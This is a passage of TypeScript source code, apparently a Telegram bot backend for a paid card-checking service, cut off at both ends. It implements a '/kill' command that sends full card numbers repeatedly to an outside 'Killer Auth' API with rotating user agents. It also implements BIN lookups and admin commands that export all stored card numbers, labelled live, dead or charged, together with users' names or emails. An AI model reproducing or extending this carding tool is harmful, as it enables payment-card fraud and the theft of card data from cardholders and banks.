${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` : ""}

<b>Card Stats</b>
• Total Checks: ${totalChecks || 0}
• ✅ Live Cards: ${liveCards || 0}
• ❌ Dead Cards: ${deadCards || 0}
• 📈 Success Rate: ${successRate}%
`, undefined, messageId);
      }
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /kill {cc} - Kill a card using Killer Auth gateway (6 sequential requests)
    if (text.startsWith("/kill")) {
      const cc = text.replace("/kill", "").trim();
      
      if (!cc) {
        await sendTelegramMessage(chatId, `
❌ <b>Usage:</b> /kill <code>cc|mm|yy|cvv</code>

<b>Example:</b>
<code>/kill 4111111111111111|12|25|123</code>

<b>Cost:</b> 5 credits (only charged on success)
`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Check if user is connected
      const { data: profile } = await supabase
        .from("profiles")
        .select("user_id, username, credits, is_banned")
        .eq("telegram_chat_id", chatId)
        .maybeSingle();

      if (!profile) {
        await sendTelegramMessage(chatId, `
❌ <b>Account Not Connected</b>

Link your Telegram to use this command.

<b>Your Chat ID:</b> <code>${chatId}</code>

Visit yunchicheck.com to connect.
`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      if (profile.is_banned) {
        await sendTelegramMessage(chatId, `🚫 <b>Account Suspended</b>\n\nYou cannot use this command while banned.`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Check credits (need at least 5 for a kill)
      if (profile.credits < 5) {
        await sendTelegramMessage(chatId, `
❌ <b>Insufficient Credits</b>

You need at least <b>5 credits</b> to kill a card.
Current balance: <b>${profile.credits}</b> credits

Top up at yunchicheck.com/dashboard/topup
`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Send processing message
      await sendTelegramMessage(chatId, `⏳ <b>Processing...</b>\n\nSending 6 requests to Killer Auth API...`, undefined, messageId);

      const startTime = Date.now();

      // User agents for rotation
      const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      ];
      
      const apiUrl = `http://killer-production.up.railway.app/kill?cc=${cc}`;
      
      // Send 6 requests sequentially and collect responses
      const responses: { attempt: number; status: string; response: string; time: string }[] = [];
      let isKilled = false;
      
      for (let i = 1; i <= 6; i++) {
        const attemptStart = Date.now();
        const userAgent = userAgents[i - 1] || userAgents[0];
        
        try {
          const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
              'User-Agent': userAgent,
              'Accept': 'application/json, text/plain, */*',
              'Cache-Control': 'no-cache',
              'Pragma': 'no-cache',
            }
          });
          
          const rawText = await response.text();
          const attemptTime = ((Date.now() - attemptStart) / 1000).toFixed(2);
          console.log(`[KILL BOT] Attempt ${i} for ${profile.username}: ${rawText}`);
          
          // Check for success via JSON response
          let attemptKilled = false;
          try {
            const jsonData = JSON.parse(rawText);
            attemptKilled = jsonData.success === true;
          } catch {
            attemptKilled = false;
          }
          if (attemptKilled) {
            isKilled = true;
          }
          
          responses.push({
            attempt: i,
            status: attemptKilled ? "🟢 KILLED" : "🔴 FAILED",
            response: rawText.substring(0, 100) + (rawText.length > 100 ? "..." : ""),
            time: attemptTime
          });
        } catch (error) {
          const attemptTime = ((Date.now() - attemptStart) / 1000).toFixed(2);
          const errMsg = error instanceof Error ? error.message : "Connection failed";
          console.error(`[KILL BOT] Attempt ${i} error:`, error);
          
          responses.push({
            attempt: i,
            status: "⚠️ ERROR",
            response: errMsg,
            time: attemptTime
          });
        }
        
        // Small delay between requests
        if (i < 6) {
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      }

      const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
      
      // Mask card for display
      const cardParts = cc.split("|");
      const maskedCard = cardParts.length >= 1 
        ? `${cardParts[0].substring(0, 6)}******${cardParts[0].slice(-4)}`
        : "Invalid card";

      // Build response message with all 6 results
      let resultMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   🎯 <b>KILLER AUTH RESULTS</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>Card:</b> <code>${escapeHtml(maskedCard)}</code>
<b>Total Time:</b> ${totalTime}s

<b>━━━ 6 API Responses ━━━</b>
`;

      responses.forEach((r) => {
        resultMessage += `
<b>#${r.attempt}</b> ${r.status} (${r.time}s)
└ <code>${escapeHtml(r.response)}</code>
`;
      });

      // Count results
      const killedCount = responses.filter(r => r.status.includes("KILLED")).length;
      const failedCount = responses.filter(r => r.status.includes("FAILED")).length;
      const errorCount = responses.filter(r => r.status.includes("ERROR")).length;

      resultMessage += `
<b>━━━ Summary ━━━</b>
🟢 Killed: <b>${killedCount}</b>
🔴 Failed: <b>${failedCount}</b>
⚠️ Errors: <b>${errorCount}</b>
`;

      if (isKilled) {
        // Deduct 5 credits for successful kill (at least one success)
        const newCredits = profile.credits - 5;
        await supabase
          .from("profiles")
          .update({ credits: newCredits, updated_at: new Date().toISOString() })
          .eq("user_id", profile.user_id);

        // Log the card check
        await supabase.from("card_checks").insert({
          user_id: profile.user_id,
          card_details: cc,
          gateway: "killer_auth",
          status: "completed",
          result: "killed"
        });

        resultMessage += `
<b>━━━ Final Status ━━━</b>
🟢 <b>KILLED SUCCESSFULLY</b> 🔥

💰 <b>-5 credits</b> | Balance: <b>${newCredits}</b>
━━━━━━━━━━━━━━━━━━━━━━
`;
      } else {
        // Log the failed check (no credits deducted)
        await supabase.from("card_checks").insert({
          user_id: profile.user_id,
          card_details: cc,
          gateway: "killer_auth",
          status: "completed",
          result: "unknown"
        });

        // Send admin debug for unknown results
        if (ADMIN_TELEGRAM_CHAT_ID) {
          const debugResponses = responses.map(r => `#${r.attempt}: ${r.response}`).join("\n");
          sendTelegramMessage(ADMIN_TELEGRAM_CHAT_ID, `
🔍 <b>Killer Auth Debug (6 Attempts)</b>

<b>User:</b> ${escapeHtml(profile.username || "Unknown")}
<b>Card:</b> <code>${escapeHtml(cc)}</code>
<b>Status:</b> UNKNOWN (0/${responses.length} killed)

<b>Responses:</b>
<pre>${escapeHtml(debugResponses.substring(0, 2000))}</pre>
`).catch(() => {});
        }

        resultMessage += `
<b>━━━ Final Status ━━━</b>
🔴 <b>NOT KILLED</b>

💰 <b>Free</b> | Balance: <b>${profile.credits}</b>
━━━━━━━━━━━━━━━━━━━━━━
`;
      }

      // Send the combined result message (NO broadcast, NO GIF)
      await sendTelegramMessage(chatId, resultMessage);

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /bin <prefix> - BIN Lookup (must check before any /binXxx commands)
    if (text === "/bin" || text.startsWith("/bin ")) {
      console.log(`[BIN] Command received from ${chatId}: ${text}`);
      const binInput = text.replace("/bin", "").trim();
      
      if (!binInput || binInput.replace(/\D/g, '').length < 6) {
        await sendTelegramMessage(chatId, `
⚠️ <b>𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣</b>

<b>Usage:</b> <code>/bin &lt;6-8 digits&gt;</code>

<b>Examples:</b>
  <code>/bin 411111</code>
  <code>/bin 45717360</code>

ℹ️ <i>Returns card brand, type, level, issuing bank &amp; country.</i>
`, undefined, messageId);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const binDigits = binInput.replace(/\D/g, '').slice(0, 8);

      // Send loading message and get its ID for editing later
      const loadingMsgId = await sendTelegramMessageWithId(chatId, `🔍 <i>Looking up</i> <code>${binDigits}</code><i>...</i>`, undefined, messageId);

      // Call the bin-lookup edge function
      let binData: any = null;
      try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/bin-lookup`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
          },
          body: JSON.stringify({ bin: binDigits }),
        });
        if (response.ok) {
          binData = await response.json();
        }
      } catch (err) {
        console.error("BIN lookup error:", err);
      }

      if (!binData || binData.error) {
        const errorMsg = `
❌ <b>𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 𝗙𝗮𝗶𝗹𝗲𝗱</b>

Could not retrieve data for <code>${binDigits}</code>.
${binData?.error ? `<i>${escapeHtml(binData.error)}</i>` : ""}

<i>Try again with a valid 6-8 digit BIN prefix.</i>
`;
        if (loadingMsgId) {
          await editTelegramMessage(chatId, loadingMsgId, errorMsg);
        } else {
          await sendTelegramMessage(chatId, errorMsg, undefined, messageId);
        }
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Country flag emoji from country code
      const getFlag = (code: string): string => {
        if (!code || code === "XX") return "🌍";
        const codePoints = code.toUpperCase().split("").map(c => 127397 + c.charCodeAt(0));
        return String.fromCodePoint(...codePoints);
      };

      // Unicode bold text for brand names
      const toBold = (s: string): string => {
        const boldMap: Record<string, string> = {
          'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛','I':'𝗜',
          'J':'𝗝','K':'𝗞','L':'𝗟','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣','Q':'𝗤','R':'𝗥',
          'S':'𝗦','T':'𝗧','U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫','Y':'𝗬','Z':'𝗭',
          'a':'𝗮','b':'𝗯','c':'𝗰','d':'𝗱','e':'𝗲','f':'𝗳','g':'𝗴','h':'𝗵','i':'𝗶',
          'j':'𝗷','k':'𝗸','l':'𝗹','m':'𝗺','n':'𝗻','o':'𝗼','p':'𝗽','q':'𝗾','r':'𝗿',
          's':'𝘀','t':'𝘁','u':'𝘂','v':'𝘃','w':'𝘄','x':'𝘅','y':'𝘆','z':'𝘇',
          '0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵',
          '/':'/', ' ':' ', '-':'-', '.':'.', '(':' (', ')':')','&':'&',
        };
        return s.split('').map(c => boldMap[c] || c).join('');
      };

      // Brand logo
      const getBrandLogo = (brand: string): string => {
        const b = brand?.toUpperCase() || "";
        if (b.includes("VISA")) return "💙 𝗩𝗜𝗦𝗔";
        if (b.includes("MASTER")) return "🟠 𝗠𝗔𝗦𝗧𝗘𝗥𝗖𝗔𝗥𝗗";
        if (b.includes("AMEX") || b.includes("AMERICAN")) return "💚 𝗔𝗠𝗘𝗫";
        if (b.includes("DISCOVER")) return "🟡 𝗗𝗜𝗦𝗖𝗢𝗩𝗘𝗥";
        if (b.includes("JCB")) return "🔴 𝗝𝗖𝗕";
        if (b.includes("UNIONPAY")) return "🔴 𝗨𝗡𝗜𝗢𝗡𝗣𝗔𝗬";
        if (b.includes("DINERS")) return "⚫ 𝗗𝗜𝗡𝗘𝗥𝗦 𝗖𝗟𝗨𝗕";
        if (b.includes("MAESTRO")) return "💜 𝗠𝗔𝗘𝗦𝗧𝗥𝗢";
        return "💳 " + toBold(brand || "UNKNOWN");
      };

      // Type icon
      const getTypeIcon = (type: string): string => {
        const t = type?.toLowerCase() || "";
        if (t.includes("credit")) return "💳";
        if (t.includes("debit")) return "🏧";
        if (t.includes("prepaid")) return "🎫";
        return "💳";
      };

      const flag = getFlag(binData.countryCode);
      const brandLogo = getBrandLogo(binData.brand);
      const typeIcon = getTypeIcon(binData.type);
      const dataSource = binData.isRealData ? "✅ 𝗟𝗶𝘃𝗲 𝗗𝗮𝘁𝗮" : "⚠️ 𝗟𝗼𝗰𝗮𝗹";

      const resultMessage = `
<b>╔══════════════════════╗</b>
<b>║</b>  🔎 <b>𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣</b>
<b>╚══════════════════════╝</b>

🔢 <b>BIN:</b>  <code>${binDigits}</code>

▬▬▬▬▬ 𝗖𝗔𝗥𝗗 ▬▬▬▬▬

  ${brandLogo}
  ${typeIcon} 𝗧𝘆𝗽𝗲:     ${toBold(binData.type || "Unknown")}
  ⭐ 𝗟𝗲𝘃𝗲𝗹:    ${toBold(binData.level || "Standard")}

▬▬▬▬ 𝗜𝗦𝗦𝗨𝗘𝗥 ▬▬▬▬▬

  🏦 𝗕𝗮𝗻𝗸:     ${toBold(binData.bank || "Unknown")}
  ${flag} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆:  ${toBold(binData.country || "Unknown")}

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

📡 ${dataSource}
<i>Powered by YunChi</i> <tg-emoji emoji-id="5336985409220001678">✔️</tg-emoji>
`;

      if (loadingMsgId) {
        await editTelegramMessage(chatId, loadingMsgId, resultMessage);
      } else {
        await sendTelegramMessage(chatId, resultMessage, undefined, messageId);
      }

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /admincmd
    if (text === "/admincmd") {
      await handleAdminCmd(chatId, supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /grantadmin
    if (text.startsWith("/grantadmin")) {
      await handleGrantAdmin(chatId, text.replace("/grantadmin", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /revokeadmin
    if (text.startsWith("/revokeadmin")) {
      await handleRevokeAdmin(chatId, text.replace("/revokeadmin", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /admins
    if (text === "/admins") {
      await handleListAdmins(chatId, supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /promote
    if (text.startsWith("/promote")) {
      await handlePromote(chatId, text.replace("/promote", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /demote
    if (text.startsWith("/demote")) {
      await handleDemote(chatId, text.replace("/demote", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /banuser
    if (text.startsWith("/banuser")) {
      await handleBanUser(chatId, text.replace("/banuser", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /cancelban
    if (text === "/cancelban") {
      await handleCancelBan(chatId, supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /unbanuser
    if (text.startsWith("/unbanuser")) {
      await handleUnbanUser(chatId, text.replace("/unbanuser", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /deleteuser
    if (text.startsWith("/deleteuser") && !text.startsWith("/deletealluser")) {
      await handleDeleteUser(chatId, text.replace("/deleteuser", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /deletealluser
    if (text === "/deletealluser") {
      await handleDeleteAllUsers(chatId, supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /broadcast
    if (text.startsWith("/broadcast")) {
      await handleBroadcast(chatId, text.replace("/broadcast", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /stats
    if (text === "/stats") {
      await handleStats(chatId, supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /topups
    if (text === "/topups") {
      const { message, keyboard } = await handleTopups(chatId, supabase, 0);
      if (message) await sendTelegramMessage(chatId, message, keyboard || undefined);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /rejectall - Reject all pending topups
    if (text === "/rejectall" || text.startsWith("/rejectall ")) {
      const reason = text.replace("/rejectall", "").trim() || undefined;
      await handleRejectAllTopups(chatId, supabase, undefined, reason);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /addfund
    if (text.startsWith("/addfund")) {
      await handleAddFund(chatId, text.replace("/addfund", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /viewbans
    if (text === "/viewbans") {
      await handleViewBans(chatId, supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /viewblocked - View blocked devices and IPs
    if (text === "/viewblocked") {
      await handleViewBlocked(chatId, supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /unblockdevice - Remove specific device or IP blocks
    if (text.startsWith("/unblockdevice")) {
      await handleUnblockDevice(chatId, text.replace("/unblockdevice", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /blockdevice - Manually block a device or IP
    if (text.startsWith("/blockdevice")) {
      await handleBlockDevice(chatId, text.replace("/blockdevice", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /userdevices - View user's device logs
    if (text.startsWith("/userdevices")) {
      await handleUserDevices(chatId, text.replace("/userdevices", "").trim(), supabase);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─────────────────────────────────────────────────────────
    // CARD STATS & EXPORT COMMANDS (Admin Only)
    // ─────────────────────────────────────────────────────────

    // /cardstats - Show real-time card statistics from all users
    if (text === "/cardstats") {
      const isAdmin = await isAdminAsync(chatId, supabase);
      if (!isAdmin) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Fetch real-time stats from all users
      const { data: allCards, count: totalCount } = await supabase
        .from("card_checks")
        .select("result, gateway, created_at, user_id", { count: "exact" });

      if (!allCards || allCards.length === 0) {
        await sendTelegramMessage(chatId, "📊 <b>Card Statistics</b>\n\n❌ No card records found in the database.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Calculate stats
      const liveCount = allCards.filter((c: any) => c.result?.toLowerCase().includes('live') || c.result?.toLowerCase().includes('approved')).length;
      const deadCount = allCards.filter((c: any) => c.result?.toLowerCase().includes('dead') || c.result?.toLowerCase().includes('declined')).length;
      const chargedCount = allCards.filter((c: any) => c.result?.toLowerCase().includes('charged')).length;
      const unknownCount = (totalCount || allCards.length) - liveCount - deadCount;
      const uniqueUsers = new Set(allCards.map((c: any) => c.user_id)).size;

      // Today's stats
      const today = new Date();
      today.setHours(0, 0, 0, 0);
      const todayCards = allCards.filter((c: any) => new Date(c.created_at) >= today);
      const todayLive = todayCards.filter((c: any) => c.result?.toLowerCase().includes('live') || c.result?.toLowerCase().includes('approved')).length;
      const todayDead = todayCards.filter((c: any) => c.result?.toLowerCase().includes('dead') || c.result?.toLowerCase().includes('declined')).length;
      const todayCharged = todayCards.filter((c: any) => c.result?.toLowerCase().includes('charged')).length;

      // Gateway breakdown
      const gateways: Record<string, number> = {};
      allCards.forEach((c: any) => {
        const gw = c.gateway || 'Unknown';
        gateways[gw] = (gateways[gw] || 0) + 1;
      });
      const gatewayStats = Object.entries(gateways)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5)
        .map(([name, count]) => `  • ${name}: ${count.toLocaleString()}`)
        .join("\n");

      const successRate = liveCount > 0 ? ((liveCount / (liveCount + deadCount)) * 100).toFixed(1) : "0.0";

      const message = `📊 <b>Real-Time Card Statistics</b>

<b>━━━ All Time ━━━</b>
📋 Total Cards: <b>${(totalCount || allCards.length).toLocaleString()}</b>
✅ Live: <b>${liveCount.toLocaleString()}</b>
❌ Dead: <b>${deadCount.toLocaleString()}</b>
💳 Charged: <b>${chargedCount.toLocaleString()}</b>
❓ Unknown: <b>${unknownCount.toLocaleString()}</b>
📈 Success Rate: <b>${successRate}%</b>
👥 Unique Users: <b>${uniqueUsers.toLocaleString()}</b>

<b>━━━ Today ━━━</b>
📋 Total: <b>${todayCards.length.toLocaleString()}</b>
✅ Live: <b>${todayLive.toLocaleString()}</b>
❌ Dead: <b>${todayDead.toLocaleString()}</b>
💳 Charged: <b>${todayCharged.toLocaleString()}</b>

<b>━━━ Top Gateways ━━━</b>
${gatewayStats || "  No gateway data"}

<i>🔄 Data fetched in real-time</i>`;

      await sendTelegramMessage(chatId, message);
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /allcards - Export all checked cards
    if (text === "/allcards") {
      const isAdmin = await isAdminAsync(chatId, supabase);
      if (!isAdmin) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // First fetch real-time stats from site_stats table
      const { data: siteStats } = await supabase
        .from("site_stats")
        .select("total_checks, total_users")
        .eq("id", "global")
        .maybeSingle();

      const statsMessage = siteStats 
        ? `📊 <b>Real-Time Stats</b>\n\n👥 Total Users: <code>${siteStats.total_users?.toLocaleString() || 0}</code>\n🔍 Total Checks: <code>${siteStats.total_checks?.toLocaleString() || 0}</code>\n\n`
        : "";

      await sendTelegramMessage(chatId, `${statsMessage}⏳ <b>Fetching all cards...</b>\n\nPlease wait while I prepare the file.`);

      // Fetch ALL cards with pagination (unlimited)
      const cards = await fetchAllRecords(
        supabase,
        "card_checks",
        "card_details, result, gateway, created_at, user_id",
        undefined,
        { column: "created_at", ascending: false }
      );
      const error = cards.length === 0 ? { message: "No data" } : null;

      if (error || !cards || cards.length === 0) {
        await sendTelegramMessage(chatId, "❌ <b>No cards found</b>\n\nThe database has no card check records.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Get unique user IDs and fetch their profiles
      const userIds = [...new Set(cards.map((c: any) => c.user_id))];
      const { data: profiles } = await supabase
        .from("profiles")
        .select("user_id, username")
        .in("user_id", userIds);

      // Also fetch emails from auth users via a separate query
      const { data: authData } = await supabase.auth.admin.listUsers();
      const emailMap = new Map<string, string>();
      if (authData?.users) {
        authData.users.forEach((u: any) => emailMap.set(u.id, u.email || ""));
      }

      // Build user lookup map (prefer username, fallback to email)
      const userMap = new Map<string, string>();
      profiles?.forEach((p: any) => {
        const email = emailMap.get(p.user_id) || "";
        userMap.set(p.user_id, p.username || email || p.user_id);
      });

      // Charge gateways that result in actual money charged
      const chargeGateways = ["paygate_charge", "stripe_charge", "payu_charge", "pwgate_charge", "rizzup_charge"];
      const chargedCount = cards.filter((c: any) => c.result === "live" && chargeGateways.includes(c.gateway)).length;
      const liveCount = cards.filter((c: any) => c.result === "live" && !chargeGateways.includes(c.gateway)).length;
      const deadCount = cards.filter((c: any) => c.result === "dead").length;
      const unknownCount = cards.filter((c: any) => c.result !== "live" && c.result !== "dead").length;

      // Format: card_details | user
      const fileContent = cards.map((c: any) => {
        const user = userMap.get(c.user_id) || c.user_id || "Unknown";
        return `${c.card_details || "Unknown"} | ${user}`;
      }).join("\n");
      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
      const filename = `all_cards_${timestamp}.txt`;

      // Save to storage bucket
      const { error: uploadError } = await supabase.storage
        .from("card-exports")
        .upload(`allcards/${filename}`, new Blob([fileContent], { type: "text/plain" }), {
          contentType: "text/plain",
          upsert: true
        });

      if (uploadError) {
        console.error("Storage upload error:", uploadError);
      }

      await sendTelegramDocument(
        chatId,
        fileContent,
        filename,
        `📊 <b>Real-Time Stats</b>\n👥 Users: ${siteStats?.total_users?.toLocaleString() || 0} | 🔍 Checks: ${siteStats?.total_checks?.toLocaleString() || 0}\n\n📁 <b>All Cards Export</b>\n\n💳 Charged: ${chargedCount}\n✅ Live: ${liveCount}\n❌ Dead: ${deadCount}\n❓ Unknown: ${unknownCount}\n\n📊 Total: ${cards.length} cards\n\n<i>Format: card | user</i>\n\n💾 <i>Saved to storage: allcards/${filename}</i>`
      );

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /livecards - Export live cards only
    if (text === "/livecards") {
      const isAdmin = await isAdminAsync(chatId, supabase);
      if (!isAdmin) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // First fetch real-time stats from site_stats table
      const { data: siteStats } = await supabase
        .from("site_stats")
        .select("total_checks, total_users")
        .eq("id", "global")
        .maybeSingle();

      const statsMessage = siteStats 
        ? `📊 <b>Real-Time Stats</b>\n\n👥 Total Users: <code>${siteStats.total_users?.toLocaleString() || 0}</code>\n🔍 Total Checks: <code>${siteStats.total_checks?.toLocaleString() || 0}</code>\n\n`
        : "";

      await sendTelegramMessage(chatId, `${statsMessage}⏳ <b>Fetching live cards...</b>\n\nPlease wait while I prepare the file.`);

      // Fetch ALL live cards with pagination (unlimited)
      const cards = await fetchAllRecords(
        supabase,
        "card_checks",
        "card_details, gateway, created_at, user_id",
        [{ column: "result", operator: "eq", value: "live" }],
        { column: "created_at", ascending: false }
      );
      const error = cards.length === 0 ? { message: "No data" } : null;

      if (error || !cards || cards.length === 0) {
        await sendTelegramMessage(chatId, "❌ <b>No live cards found</b>\n\nThere are no live card records in the database.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Get unique user IDs and fetch their profiles
      const userIds = [...new Set(cards.map((c: any) => c.user_id))];
      const { data: profiles } = await supabase
        .from("profiles")
        .select("user_id, username")
        .in("user_id", userIds);

      const { data: authData } = await supabase.auth.admin.listUsers();
      const emailMap = new Map<string, string>();
      if (authData?.users) {
        authData.users.forEach((u: any) => emailMap.set(u.id, u.email || ""));
      }

      const userMap = new Map<string, string>();
      profiles?.forEach((p: any) => {
        const email = emailMap.get(p.user_id) || "";
        userMap.set(p.user_id, p.username || email || p.user_id);
      });

      const fileContent = cards.map((c: any) => {
        const user = userMap.get(c.user_id) || c.user_id || "Unknown";
        return `${c.card_details || "Unknown"} | ${user}`;
      }).join("\n");
      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
      const filename = `live_cards_${timestamp}.txt`;

      // Save to storage bucket
      const { error: uploadError } = await supabase.storage
        .from("card-exports")
        .upload(`livecards/${filename}`, new Blob([fileContent], { type: "text/plain" }), {
          contentType: "text/plain",
          upsert: true
        });

      if (uploadError) {
        console.error("Storage upload error:", uploadError);
      }

      await sendTelegramDocument(
        chatId,
        fileContent,
        filename,
        `📊 <b>Real-Time Stats</b>\n👥 Users: ${siteStats?.total_users?.toLocaleString() || 0} | 🔍 Checks: ${siteStats?.total_checks?.toLocaleString() || 0}\n\n📁 <b>Live Cards Export</b>\n\n✅ Total Live Cards: ${cards.length}\n\n<i>Format: card | user</i>\n\n💾 <i>Saved to storage: livecards/${filename}</i>`
      );

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // /deadcards - Export dead cards only
    if (text === "/deadcards") {
      const isAdmin = await isAdminAsync(chatId, supabase);
      if (!isAdmin) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // First fetch real-time stats from site_stats table
      const { data: siteStats } = await supabase
        .from("site_stats")
        .select("total_checks, total_users")
        .eq("id", "global")
        .maybeSingle();

      const statsMessage = siteStats 
        ? `📊 <b>Real-Time Stats</b>\n\n👥 Total Users: <code>${siteStats.total_users?.toLocaleString() || 0}</code>\n🔍 Total Checks: <code>${siteStats.total_checks?.toLocaleString() || 0}</code>\n\n`
        : "";

      await sendTelegramMessage(chatId, `${statsMessage}⏳ <b>Fetching dead cards...</b>\n\nPlease wait while I prepare the file.`);

      // Fetch ALL dead cards with pagination (unlimited)
      const cards = await fetchAllRecords(
        supabase,
        "card_checks",
        "card_details, gateway, created_at, user_id",
        [{ column: "result", operator: "eq", value: "dead" }],
        { column: "created_at", ascending: false }
      );
      const error = cards.length === 0 ? { message: "No data" } : null;

      if (error || !cards || cards.length === 0) {
